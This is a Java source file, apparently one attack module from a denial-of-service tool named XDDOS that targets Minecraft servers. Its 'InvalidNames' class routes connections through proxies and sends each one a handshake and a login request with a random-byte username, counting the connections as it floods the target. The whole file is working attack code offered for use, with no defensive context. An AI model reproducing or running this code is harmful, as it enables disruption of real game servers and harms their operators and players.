package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.nio.charset.Charset;
import java.util.Random;

public class InvalidNames
  implements Method {
  private Handshake handshake;
  private byte[] bytes;
  
  private String randomString(int len) {
    byte[] array = new byte[len];
    (new Random()).nextBytes(array);
    return new String(array, Charset.forName("UTF-8"));
  }
  
  public InvalidNames() {
    this.handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
    this.bytes = this.handshake.getWrappedPacket();
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.bytes));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(randomString(16))).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
